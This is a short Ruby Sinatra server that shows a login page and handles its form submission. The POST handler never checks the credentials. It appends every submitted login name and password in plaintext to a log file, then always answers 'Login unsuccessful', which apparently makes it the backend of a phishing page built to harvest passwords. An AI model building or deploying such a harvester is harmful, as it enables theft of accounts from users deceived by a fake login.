require 'rubygems'
require 'sinatra'
require 'sinatra/flash'
require 'sinatra/redirect_with_flash'

class Server < Sinatra::Base
  enable :sessions
  register Sinatra::Flash
  helpers Sinatra::RedirectWithFlash

  post '/index_submit' do
    open('logfile', 'a') do |f|
      f.puts "#{params[:login]} #{params[:password]}"
    end
    redirect '/', error: 'Login unsuccessful'
  end

  get '/' do
    erb File.read('index.html.erb')
  end

end
